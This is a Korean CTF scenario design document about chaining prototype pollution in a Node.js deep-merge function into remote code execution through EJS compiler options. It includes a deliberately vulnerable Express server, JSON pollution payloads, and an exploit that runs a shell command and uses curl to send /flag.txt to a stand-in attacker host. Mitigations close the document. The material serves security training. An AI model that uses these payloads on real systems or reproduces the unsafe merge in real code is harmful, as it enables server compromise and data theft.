---
title: Prototype Pollution to Template Compiler RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, nodejs, prototype-pollution, rce, ejs, template-engine]
confidence: high
---

# Prototype Pollution to Template Compiler RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Elegant Renderer (우아한 템플릿 렌더러)
- **난이도**: High
- **핵심 컨셉**: Node.js 환경에서 입력 데이터 객체 병합 시 발생하는 **프로토타입 오염(Prototype Pollution)** 취약점을 인기 템플릿 엔진인 **EJS**의 컴파일 가젯(Compiler Gadget)과 연계하여 **원격 코드 실행(RCE)**으로 연쇄 전개하는 최고급 취약점 문제입니다. 대상 애플리케이션은 사용자가 전송한 JSON 형식의 테마 설정을 안전하지 않게 병합(Merge)하는 과정에서 `__proto__` 오염에 무방비합니다. 공격자는 내부 템플릿 렌더링 엔진인 EJS의 동작 원리를 분석하여, 컴파일 옵션 속성인 `client` 또는 `escape` 등을 프로토타입 오염을 통해 변조하고 결과적으로 템플릿 컴파일러가 생성하는 함수 바디에 동적 JS 코드가 삽입 및 실행되게 만듭니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **JSON Configuration Endpoint (`/api/settings`)**:
  - 사용자가 JSON 테마 설정을 전송하면 기존 기본 테마 객체와 깊은 복사/병합을 수행합니다.
- **Render Engine (EJS)**:
  - 홈페이지 메인화면 `/` 또는 `/render` 접속 시 서버 측 템플릿인 EJS 파일을 로드해 HTML을 렌더링합니다.
- **Flag 위치**:
  - 서버 파일 시스템 내부(`/flag.txt`) 혹은 환경 변수에 존재하며 RCE 획득 후 읽어내야 합니다.

### 2.2 취약점 지점
1. **Unsafe Deep Merge Function**:
   - 객체 병합 시 재귀 함수를 이용해 입력 키값의 필터링 없이 값을 대입합니다. `__proto__` 또는 `constructor.prototype` 속성이 차단되지 않아 글로벌 Object 프로토타입 오염이 유발됩니다.
2. **EJS Template Compiler Options Overwrite**:
   - EJS는 템플릿을 동적으로 컴파일할 때 옵션 객체(`options`)를 참조하며, 설정되지 않은 속성의 경우 `Object.prototype`을 따라 기본값으로 상속받습니다.
   - 공격자가 프로토타입을 통해 EJS의 컴파일 로직 제어 변수(예: `outputFunctionName` 또는 `destructuredLocals` 등)를 오염시키면, 컴파일 대상 문자열 함수 내부(Function Constructor)에 임의의 자바스크립트 구문이 주입되어 최종 템플릿 호출 시점에 RCE가 성립합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 페이로드 유형 | 설명 |
|------------|--------|------|---------------|------|
| `/api/settings` | POST | 불필요 | JSON | `__proto__`를 이용한 글로벌 프로토타입 오염 트리거 |
| `/` | GET | 불필요 | Query Parameter | 렌더링 과정에서 오염된 프로토타입 기반으로 EJS 컴파일러가 RCE 가동 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 프로토타입 오염 취약점 확인
1. 설정 엔드포인트 `/api/settings`에 아래와 같은 JSON 페이로드를 전달합니다.
   ```json
   {
     "theme": {
       "__proto__": {
         "polluted": "yes_it_is"
       }
     }
   }
   ```
2. 이후 서버 단 응답 및 임의의 객체가 `polluted` 속성을 가지는지 간접 파악하여, 프로토타입 오염이 성공적으로 동작함을 진단합니다.

### Step 2. EJS 렌더링 가젯 탐색
EJS 라이브러리 내부 컴파일러 구조(예: `lib/ejs.js` 내부) 상, 템플릿을 생성할 때 `options.client` 속성이 없으면 프로토타입을 타고 올라가게 되고, `options.escape` 함수를 컴파일 도중 템플릿 빌드 문자열에 연결(Concatenate)한다는 메커니즘을 파악합니다.
- 특정 버전의 EJS에서는 `client` 속성이 true일 때, 내부 로직 중 `escapeFn` 정의 시 `options.escape`를 오염시키면 해당 문자열이 검증 없이 `new Function` 함수 컴파일 블록에 직접 주입되는 흐름이 존재합니다.
- 또는 `destructuredLocals` 혹은 `outputFunctionName` 속성을 자바스크립트 페이로드로 오염시켜 RCE를 노릴 수 있습니다.

### Step 3. 익스플로잇 페이로드 작성 및 송신
1. `/api/settings`로 프로토타입 오염 공격을 감행합니다. 여기서는 `outputFunctionName` 가젯을 활용합니다.
   - **오염 페이로드 예시**:
     ```json
     {
       "theme": {
         "__proto__": {
           "client": true,
           "escapeFunction": "1; process.mainModule.require('child_process').execSync('curl http://attacker.local/log?c=$(cat /flag.txt)')"
         }
       }
     }
     ```
     *(EJS 버전에 따라 가젯이 상이하며, `outputFunctionName`에 `x; global.process.mainModule.require('child_process').execSync('payload'); //` 형태로 주입할 수도 있음)*
2. 서버는 이 설정을 파싱 및 병합하여 `Object.prototype.client`를 `true`로, `Object.prototype.escapeFunction`을 악성 쉘 명령 구문으로 오염시킵니다.

### Step 4. RCE 유발 및 flag 획득
1. 템플릿 렌더링을 트리거하기 위해 메인 페이지 `/`에 접속합니다.
2. 백엔드에서 `ejs.renderFile`이 실행되는 순간, 오염된 옵션들이 상속되어 템플릿 렌더링 함수 컴파일 과정에서 `escapeFunction`에 주입한 임의의 시스템 명령어(`cat /flag.txt`)가 실행됩니다.
3. 공격자의 수신 서버로 플래그(`FLAG{prototype_pollution_to_ejs_compiler_gadget_rce}`) 데이터가 전송됩니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express + EJS)

```javascript
// app.js (취약한 Express/EJS 서버 예시)
const express = require('express');
const ejs = require('ejs');
const app = express();

app.use(express.json());
app.set('view engine', 'ejs');

let globalSettings = {
    theme: {
        primaryColor: "#3498db",
        backgroundColor: "#ffffff"
    }
};

// 취약점 지점 1: 재귀 호출을 이용한 안전하지 않은 객체 깊은 병합(Deep Merge)
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            // 차단 필터(예: '__proto__', 'constructor') 가 없어 프로토타입 오염에 노출됨
            target[key] = source[key];
        }
    }
    return target;
}

app.post('/api/settings', (req, res) => {
    const userSettings = req.body;
    
    // 기본 설정에 사용자 커스텀 설정을 병합
    merge(globalSettings, userSettings);
    
    res.json({ status: "success", currentSettings: globalSettings });
});

app.get('/', (req, res) => {
    // 취약점 지점 2: EJS 템플릿 렌더링 시, 
    // 로컬 옵션 객체에 명시되지 않은 필드(client, escape 등)가 오염된 Object.prototype을 상속받음
    res.render('index', { 
        title: "Elegant Portal", 
        user: "Guest" 
    });
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **프로토타입 오염 방어 패턴 도입**:
   - 객체 복사 및 병합 함수 내부에서 민감한 특성 키값(`__proto__`, `constructor`, `prototype`)의 진입을 사전에 엄격히 필터링(블랙리스트/화이트리스트 검사)합니다.
     ```javascript
     if (key === '__proto__' || key === 'constructor') continue;
     ```
   - 객체 생성 시 프로토타입 체인을 가지지 않는 완전 순수 객체(`Object.create(null)`)를 기반으로 병합을 처리합니다.
2. **객체 동적 동결 (Object.freeze)**:
   - 애플리케이션 시작 단계에서 `Object.freeze(Object.prototype)`를 적용하여 런타임 중에 글로벌 프로토타입 속성이 변경되는 현상을 근원적으로 봉쇄합니다.
3. **안전한 라이브러리 연동**:
   - 직접 작성한 병합 함수 대신 최신 버전의 `lodash.merge` 등을 사용하고, EJS 및 템플릿 엔진 패키지를 항상 최신 보안 패치 상태로 유지하여 가젯 오염을 방지합니다.
